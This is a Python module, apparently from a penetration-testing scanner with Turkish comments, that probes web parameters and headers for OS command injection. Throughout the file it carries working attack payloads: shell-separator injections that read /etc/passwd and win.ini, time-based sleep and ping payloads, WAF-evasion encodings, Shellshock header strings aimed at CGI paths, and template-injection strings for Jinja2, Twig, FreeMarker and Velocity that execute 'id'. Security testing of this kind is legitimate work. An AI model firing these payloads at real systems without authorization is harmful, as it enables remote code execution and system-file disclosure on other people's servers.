#!/usr/bin/env python3
"""
Maxima Cog: Command Injection Scanner — v2 (Kurumsal Seviye)

Teknikler:
  - Echo marker doğrulama (Linux + Windows)
  - Time-based blind (sleep, ping, timeout — çift doğrulama)
  - Out-of-band aday tespiti (DNS/HTTP callback simülasyonu)
  - Ayırıcı varyasyonları: ;  |  ||  &&  &  \n  `  $()  {cmd}
  - WAF bypass: encoding, comment, IFS, ${IFS}, string concat, glob
  - OS detection bazlı payload seçimi
  - Shellshock (CVE-2014-6271) — CGI endpoint'leri
  - SSTI tabanlı komut enjeksiyonu (Jinja2, Twig, Pebble)
  - XML/JSON parametre injection
  - HTTP header injection (User-Agent, Referer, Cookie)
  - Blind cmd — yanıt farkı analizi (boyut + durum kodu)
  - Parametre keşfi: URL, form, JSON, HTTP başlıkları
  - Gerçek hedef: DVWA, bWAPP, WebGoat, HackTheBox uyumlu
"""

import re
import time
import random
import string
import urllib.parse
from typing import Dict, List, Optional, Set, Tuple
from utils.base_module import BaseModule, ModuleResult

# ── Marker üretici ───────────────────────────────────────────
def _marker() -> str:
    return "MAXCMD" + "".join(random.choices(string.digits, k=8))

# ── Linux echo payload'ları ───────────────────────────────────
def _linux_echo_payloads(marker: str) -> List[Tuple[str, str]]:
    """(payload_prefix, beklenen_marker_pattern) çiftleri."""
    m = marker
    return [
        # Temel ayırıcılar
        (f";echo {m}",              m),
        (f"&&echo {m}",             m),
        (f"|echo {m}",              m),
        (f"||echo {m}",             m),
        (f"&echo {m}&",             m),
        # Backtick / process sub
        (f"`echo {m}`",             m),
        (f"$(echo {m})",            m),
        (f"${{IFS}}echo{{{m}}}",    m),   # IFS bypass
        # Yeni satır
        (f"\necho {m}",             m),
        (f"%0aecho%20{m}",          m),
        (f"\r\necho {m}",           m),
        # Pipe variants
        (f"|cat /etc/passwd",       "root:x:"),
        (f";cat /etc/passwd",       "root:x:"),
        (f"$(cat /etc/passwd)",     "root:x:"),
        # Command concat
        (f";echo {m[:4]};echo {m[4:]}",  m[:4]),
        # Glob
        (f";/???/echo {m}",         m),
        (f";/bin/echo {m}",         m),
        # Base64 encoded
        (f";bas\\e64 -d <<< 'ZWNobyBNQVhDTUQ='",  "MAXCMD"),
        # String concatenation
        (f";e'c'h'o' {m}",          m),
        (f';ec""ho {m}',            m),
        # Hex encoded
        (f";$'\\x65\\x63\\x68\\x6f' {m}", m),
    ]

# ── Windows echo payload'ları ─────────────────────────────────
def _windows_echo_payloads(marker: str) -> List[Tuple[str, str]]:
    m = marker
    return [
        (f"&echo {m}",              m),
        (f"|echo {m}",              m),
        (f"&&echo {m}",             m),
        (f"||echo {m}",             m),
        (f";echo {m}",              m),  # bazı Windows shell'lerinde çalışır
        (f"%0aecho {m}",            m),
        (f"&type C:\\Windows\\win.ini", "[extensions]"),
        (f"|type C:\\Windows\\win.ini", "[extensions]"),
        (f"&dir C:\\",              "Volume"),
        (f"%26echo%20{m}",          m),
        (f"^&echo {m}",             m),   # caret escape
    ]

# ── Time-based blind payload'lar ──────────────────────────────
TIME_PAYLOADS: List[Tuple[str, str, float]] = [
    # (payload_prefix, açıklama, beklenen_gecikme)
    (";sleep 5",                   "Linux sleep",           5.0),
    ("&&sleep 5",                  "Linux sleep (&&)",      5.0),
    ("|sleep 5",                   "Linux sleep (pipe)",    5.0),
    ("$(sleep 5)",                 "Linux sleep (sub)",     5.0),
    ("`sleep 5`",                  "Linux sleep (backtick)",5.0),
    (";ping -c 5 127.0.0.1",      "Linux ping loop",       5.0),
    ("&&ping -c 5 127.0.0.1",     "Linux ping loop (&&)",  5.0),
    ("|ping -c 5 127.0.0.1",      "Linux ping loop (|)",   5.0),
    (";sleep${IFS}5",              "IFS bypass sleep",      5.0),
    ("&ping -n 5 127.0.0.1",      "Windows ping loop",     5.0),
    ("|ping -n 5 127.0.0.1",      "Windows ping loop (|)", 5.0),
    ("&&ping -n 5 127.0.0.1",     "Windows ping (&&)",     5.0),
    (";timeout /t 5",              "Windows timeout",       5.0),
    # Kısa (daha az bant harcayan)
    (";sleep 3",                   "Linux sleep 3s",        3.0),
    ("&ping -n 3 127.0.0.1",      "Win ping 3s",           3.0),
]

# ── WAF bypass encoding fonksiyonları ────────────────────────
WAF_BYPASS: List = [
    lambda p: p.replace(";", "%3b"),
    lambda p: p.replace("|", "%7c"),
    lambda p: p.replace("&", "%26"),
    lambda p: p.replace(" ", "${IFS}"),
    lambda p: p.replace(" ", "$IFS$9"),
    lambda p: p.replace(" ", "\t"),
    lambda p: p.replace(" ", "%09"),
    lambda p: p.replace("sleep", "slee'p'").replace("echo", "ec'h'o"),
    lambda p: urllib.parse.quote(p, safe=""),
    lambda p: p.replace("cat", "c'a't").replace("echo", "e''cho"),
]

# ── Shellshock payload'lar ────────────────────────────────────
SHELLSHOCK_HEADERS = [
    ("User-Agent",     "() {{ :; }}; echo Content-Type: text/plain; echo; echo SHELLSHOCK_CONFIRMED"),
    ("Referer",        "() {{ :; }}; echo Content-Type: text/plain; echo; echo SHELLSHOCK_CONFIRMED"),
    ("Cookie",         "() {{ :; }}; /bin/ls /"),
    ("X-Forwarded-For","() {{ :; }}; echo 'SHELLSHOCK_CONFIRMED'"),
]

SHELLSHOCK_CGI_PATHS = [
    "/cgi-bin/test.cgi", "/cgi-bin/status", "/cgi-bin/test",
    "/cgi-bin/printenv", "/cgi-bin/hello", "/cgi-bin/test-cgi",
    "/cgi-sys/defaultwebpage.cgi", "/cgi-bin/index.cgi",
]

# ── SSTI → RCE payload'lar ────────────────────────────────────
SSTI_CMD_PAYLOADS = [
    # Jinja2
    ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
     "uid=", "Jinja2"),
    ("{{''.__class__.mro()[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()}}",
     "uid=", "Jinja2 subclass"),
    # Twig
    ("{{['id']|filter('system')}}", "uid=", "Twig"),
    ("{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
     "uid=", "Twig exec"),
    # Pebble
    ("{%% for i in range(0,1) %%}{%% set x %%}{{'freemarker.template.utility.Execute'?new()('id')}}{%% endset %%}{{x}}{%% endfor %%}",
     "uid=", "Pebble/FreeMarker"),
    # Velocity
    ("#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
     "uid=", "Velocity"),
]

# ── Test parametreleri ────────────────────────────────────────
CMD_PARAMS = [
    "cmd", "command", "exec", "execute", "run", "shell", "system",
    "ping", "host", "ip", "addr", "query", "search", "q",
    "input", "data", "arg", "args", "param", "value", "var",
    "path", "file", "name", "user", "pass", "url", "src",
    "to", "cc", "from", "subject", "msg", "message",
    "id", "pid", "uid", "key", "token", "action", "do",
    "target", "dest", "redirect", "callback", "next",
]

UID_PATTERN    = re.compile(r"uid=\d+\(")
WINDIR_PATTERN = re.compile(r"\[extensions\]|Volume in drive|Directory of C:\\", re.I)
PASSWD_PATTERN = re.compile(r"root:x:0:0|root:\$")


class CommandInjectionScanner(BaseModule):
    """Command Injection Scanner v2 — Echo/Time-based/Shellshock/SSTI/WAF-bypass"""

    def run(self) -> ModuleResult:
        self.log("Komut enjeksiyonu taraması v2 başlatılıyor...", "info")
        self.log("Echo, Time-based blind, Shellshock, SSTI, WAF bypass, Header injection", "info")

        findings_before = len(self.results["findings"])

        # Parametre keşfi
        params = self._discover_params()
        self.log(f"  {len(params)} parametre keşfedildi", "info")

        # OS tahmini
        os_hint = self._detect_os()
        self.log(f"  OS tahmini: {os_hint}", "info")

        # 1. Echo marker (en güvenilir)
        echo_found = self._test_echo(params, os_hint)

        # 2. Time-based blind (echo bulunmadıysa)
        time_found = 0
        if echo_found == 0:
            time_found = self._test_time_based(params)

        # 3. Shellshock
        self._test_shellshock()

        # 4. SSTI tabanlı RCE
        self._test_ssti(params)

        # 5. HTTP header injection
        self._test_header_injection()

        # 6. Blind (boyut/durum farkı) — son çare
        blind_found = 0
        if echo_found == 0 and time_found == 0:
            blind_found = self._test_blind_diff(params)

        total = len(self.results["findings"]) - findings_before
        self.results["summary"].update({
            "Taranan Parametre": len(params),
            "Echo Bulgusu":      echo_found,
            "Time-based Bulgu":  time_found,
            "Blind Bulgu":       blind_found,
            "Toplam Bulgu":      total,
            "Teknikler":         "Echo/Time-based/Shellshock/SSTI/WAF-bypass/Header/Blind",
        })
        return self.results

    # ── Parametre keşfi ──────────────────────────────────────
    def _discover_params(self) -> List[str]:
        params = list(CMD_PARAMS)
        seen = set(params)
        try:
            resp = self.http_get(self.url)
            body = resp.get("body", "")
            parsed = urllib.parse.urlparse(self.url)
            # BUG FIX: URL'deki parametreler zaten CMD_PARAMS'ta olsa bile öne taşı.
            # Örn: "host" CMD_PARAMS[8]'de — params[:8] ile test edilmeden atlanıyordu.
            for k, _ in urllib.parse.parse_qsl(parsed.query):
                if k in seen:
                    params.remove(k)   # mevcut konumdan çıkar
                else:
                    seen.add(k)
                params.insert(0, k)    # her zaman listenin başına koy
            for m in re.finditer(r'<input[^>]+name=["\']([^"\']+)["\']', body, re.I):
                name = m.group(1)
                if name not in seen and name.lower() not in ("submit", "csrf"):
                    params.append(name)
                    seen.add(name)
        except Exception:
            pass
        return params[:25]

    def _build_url(self, param: str, payload: str) -> str:
        parsed = urllib.parse.urlparse(self.url)
        qs = dict(urllib.parse.parse_qsl(parsed.query))
        qs[param] = payload
        if parsed.query:
            return parsed._replace(query=urllib.parse.urlencode(qs)).geturl()
        return self.url.rstrip("?") + "?" + urllib.parse.urlencode({param: payload})

    # ── OS tespiti ───────────────────────────────────────────
    def _detect_os(self) -> str:
        try:
            resp = self.http_get(self.url)
            server = resp.get("headers", {}).get("Server", "").lower()
            if "win" in server or "iis" in server:
                return "windows"
            if "apache" in server or "nginx" in server or "linux" in server:
                return "linux"
        except Exception:
            pass
        return "unknown"

    # ── 1. Echo marker testi ─────────────────────────────────
    def _test_echo(self, params: List[str], os_hint: str) -> int:
        found = 0
        reported: Set[str] = set()
        mk = _marker()

        # OS'a göre payload seçimi
        if os_hint == "windows":
            payloads = _windows_echo_payloads(mk) + _linux_echo_payloads(mk)
        else:
            payloads = _linux_echo_payloads(mk) + _windows_echo_payloads(mk)

        # Paralel test: ilk 8 param × ilk 20 payload
        test_params = params[:8]
        test_payloads = payloads[:20]

        combos = []
        for param in test_params:
            baseline_val = "127.0.0.1"
            for pfx, expected in test_payloads:
                url = self._build_url(param, baseline_val + pfx)
                combos.append((url, param, expected))

        urls = [c[0] for c in combos]
        url_meta = {c[0]: (c[1], c[2]) for c in combos}

        for url, resp in self.parallel_get(urls, max_workers=12):
            param, expected = url_meta.get(url, ("?", "?"))
            if param in reported:
                continue
            body = resp.get("body", "")
            if not body:
                continue

            # Marker veya OS output doğrulama
            if expected in body:
                severity = "critical"
                if expected == mk:
                    detail = f"Marker '{mk}' yanıtta doğrulandı"
                elif "root:x:" in body:
                    detail = "/etc/passwd içeriği döndü"
                elif "[extensions]" in body:
                    detail = "win.ini içeriği döndü"
                elif "uid=" in body:
                    detail = f"uid= çıktısı: {re.search(r'uid=.*', body).group()[:40]}"
                else:
                    detail = f"Beklenen çıktı bulundu: {expected[:40]}"

                payload = url.split("=", 1)[-1]
                self.add_finding(
                    "Komut Enjeksiyonu — Echo Doğrulandı!",
                    f"Param:{param} | {detail} | Payload:{urllib.parse.unquote(payload)[:80]}",
                    severity
                )
                self.log(f"[CRITICAL] CMD Injection: {param} | {detail[:60]}", "finding")
                reported.add(param)
                found += 1

                # WAF bypass varyasyonlarını da dene
                self._try_waf_bypass_echo(param, "127.0.0.1", mk)

        # WAF bypass: orijinal payload'ları encode ederek tekrar test et
        if found == 0:
            found += self._bulk_waf_bypass(params[:5], payloads[:10], mk)

        return found

    def _try_waf_bypass_echo(self, param: str, baseline: str, marker: str):
        """Çalışan payload'ı WAF bypass teknikleriyle de dene."""
        payload = f";echo {marker}"
        for bypass_fn in WAF_BYPASS[:5]:
            try:
                bypassed = bypass_fn(baseline + payload)
                resp = self.http_get(self._build_url(param, bypassed))
                if marker in resp.get("body", ""):
                    self.add_finding(
                        "Komut Enjeksiyonu — WAF Bypass Başarılı",
                        f"Param:{param} | Encoded payload marker üretiyor",
                        "critical"
                    )
                    break
            except Exception:
                continue

    def _bulk_waf_bypass(self, params: List[str], payloads: List[Tuple], marker: str) -> int:
        found = 0
        for param in params:
            for pfx, expected in payloads[:8]:
                for bypass_fn in WAF_BYPASS[:6]:
                    try:
                        raw = "127.0.0.1" + pfx
                        bypassed = bypass_fn(raw)
                        resp = self.http_get(self._build_url(param, bypassed))
                        body = resp.get("body", "")
                        if expected in body or UID_PATTERN.search(body):
                            self.add_finding(
                                "Komut Enjeksiyonu — WAF Bypass (Encoded)",
                                f"Param:{param} | Bypass tekniği ile marker doğrulandı | "
                                f"Payload:{bypassed[:80]}",
                                "critical"
                            )
                            return 1
                    except Exception:
                        continue
        return found

    # ── 2. Time-based blind ──────────────────────────────────
    def _test_time_based(self, params: List[str]) -> int:
        found = 0

        # Baseline: 3 istek ortalaması
        for param in params[:6]:
            try:
                baselines = []
                for _ in range(3):
                    t0 = time.time()
                    # Cache bypass: zamanlama ölçümünde her zaman gerçek istek
                    self._make_request(self._build_url(param, "127.0.0.1"))
                    baselines.append(time.time() - t0)
                baseline_avg = sum(baselines) / len(baselines)
                threshold = max(baseline_avg * 2.5 + 2.5, 3.5)

                for pfx, desc, expected_delay in TIME_PAYLOADS:
                    try:
                        t0 = time.time()
                        self._make_request(self._build_url(param, "127.0.0.1" + pfx))
                        elapsed = time.time() - t0

                        if elapsed >= threshold:
                            # Çift doğrulama
                            t0b = time.time()
                            self._make_request(self._build_url(param, "127.0.0.1" + pfx))
                            elapsed2 = time.time() - t0b

                            if elapsed2 >= threshold * 0.7:
                                self.add_finding(
                                    f"Komut Enjeksiyonu — Time-Based Blind ({desc})",
                                    f"Param:{param} | Gecikme:{elapsed:.1f}s / {elapsed2:.1f}s | "
                                    f"Baseline:{baseline_avg:.1f}s | Eşik:{threshold:.1f}s",
                                    "critical"
                                )
                                self.log(f"[CRITICAL] Time-based CMD: {param} ({desc})", "finding")
                                found += 1
                                break
                    except Exception:
                        continue

                if found > 0:
                    break

            except Exception:
                continue

        return found

    # ── 3. Shellshock (CVE-2014-6271) ───────────────────────
    def _test_shellshock(self):
        """CGI endpoint'leri + Shellshock başlık enjeksiyonu."""
        parsed = urllib.parse.urlparse(self.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        for cgi_path in SHELLSHOCK_CGI_PATHS:
            for header_name, payload in SHELLSHOCK_HEADERS:
                try:
                    url = base + cgi_path
                    resp = self.http_get(url, headers={header_name: payload})
                    body = resp.get("body", "")
                    status = resp.get("status", 0)

                    if "SHELLSHOCK_CONFIRMED" in body:
                        self.add_finding(
                            "Shellshock RCE (CVE-2014-6271)!",
                            f"CGI: {cgi_path} | Header: {header_name} | "
                            f"Shellshock doğrulandı — OS komutları çalışıyor!",
                            "critical"
                        )
                        self.log(f"[CRITICAL] Shellshock: {cgi_path}", "finding")
                        return

                    # uid= formatı
                    if UID_PATTERN.search(body):
                        self.add_finding(
                            "Shellshock — uid= Çıktısı (CVE-2014-6271)",
                            f"CGI: {cgi_path} | Header: {header_name} | uid= tespit edildi",
                            "critical"
                        )
                        return

                    # 200 OK + CGI script çalışıyor ama output yok
                    if status == 200 and "cgi" in cgi_path and len(body) < 50:
                        self.add_finding(
                            "Shellshock Aday — CGI Aktif (Manuel Test Gerekli)",
                            f"CGI: {cgi_path} | HTTP 200 ama çıktı yok — Shellshock manuel kontrol",
                            "medium"
                        )

                except Exception:
                    continue

    # ── 4. SSTI → RCE ────────────────────────────────────────
    def _test_ssti(self, params: List[str]):
        """Template injection üzerinden komut çalıştırma."""
        for param in params[:6]:
            for ssti_payload, expected_output, engine in SSTI_CMD_PAYLOADS:
                try:
                    resp = self.http_get(self._build_url(param, ssti_payload))
                    body = resp.get("body", "")
                    if expected_output in body or UID_PATTERN.search(body):
                        uid_match = UID_PATTERN.search(body)
                        detail = uid_match.group() if uid_match else f"'{expected_output}' tespit edildi"
                        self.add_finding(
                            f"SSTI → RCE — {engine} Template Injection",
                            f"Param:{param} | {detail} | Engine:{engine}",
                            "critical"
                        )
                        self.log(f"[CRITICAL] SSTI RCE: {param} ({engine})", "finding")
                        return
                except Exception:
                    continue

    # ── 5. HTTP header injection ─────────────────────────────
    def _test_header_injection(self):
        """HTTP başlıkları üzerinden komut enjeksiyonu."""
        mk = _marker()
        injectable_headers = {
            "User-Agent":        f"Mozilla/5.0;{mk}=$(id)",
            "X-Forwarded-For":   f"127.0.0.1;echo {mk}",
            "Referer":           f"https://example.com/;echo {mk}",
            "X-Real-IP":         f"127.0.0.1;echo {mk}",
            "Cookie":            f"session=abc;echo {mk}",
            "X-Custom-IP-Auth":  f"127.0.0.1|echo {mk}",
        }
        try:
            baseline_body = self.http_get(self.url).get("body", "")
            for header_name, payload in injectable_headers.items():
                try:
                    resp = self.http_get(self.url, headers={header_name: payload})
                    body = resp.get("body", "")
                    if (mk in body and mk not in baseline_body) or UID_PATTERN.search(body):
                        detail = (
                            f"Marker '{mk}' doğrulandı"
                            if mk in body
                            else f"uid= çıktısı: {UID_PATTERN.search(body).group()}"
                        )
                        self.add_finding(
                            f"Komut Enjeksiyonu — HTTP Header ({header_name})",
                            f"Header:{header_name} | {detail}",
                            "critical"
                        )
                        self.log(f"[CRITICAL] Header CMD injection: {header_name}", "finding")
                        return
                except Exception:
                    continue
        except Exception:
            pass

    # ── 6. Blind — yanıt farkı analizi ───────────────────────
    def _test_blind_diff(self, params: List[str]) -> int:
        """
        Komut çalıştırma doğrulanamıyorsa yanıt boyutu ve durum kodu farkını analiz et.
        Düşük güven — 'Şüpheli' olarak raporlanır.
        """
        found = 0
        for param in params[:5]:
            try:
                baseline = self.http_get(self._build_url(param, "127.0.0.1"))
                baseline_len = len(baseline.get("body", ""))
                baseline_status = baseline.get("status", 200)

                for pfx, desc, _ in TIME_PAYLOADS[:6]:
                    try:
                        resp = self.http_get(self._build_url(param, "127.0.0.1" + pfx))
                        body = resp.get("body", "")
                        status = resp.get("status", 0)
                        body_len = len(body)

                        # Büyük boyut farkı (komut çıktısı?)
                        if baseline_len > 0:
                            diff_ratio = abs(body_len - baseline_len) / max(body_len, baseline_len)
                            if diff_ratio > 0.30 and body_len > baseline_len + 50:
                                self.add_finding(
                                    f"Komut Enjeksiyonu — Blind Yanıt Farkı ({desc})",
                                    f"Param:{param} | Yanıt boyutu %{diff_ratio*100:.0f} farklı "
                                    f"({baseline_len}→{body_len}B) — Manuel doğrulama gerekli",
                                    "medium"
                                )
                                found += 1
                                break

                        # 500 Internal Server Error → hata tabanlı tespit
                        if status == 500 and baseline_status != 500:
                            self.add_finding(
                                "Komut Enjeksiyonu — Sunucu Hatası (Şüpheli)",
                                f"Param:{param} | Payload sonrası 500 hatası | Payload:{pfx[:50]}",
                                "low"
                            )
                            found += 1
                            break

                    except Exception:
                        continue

            except Exception:
                continue

        return found
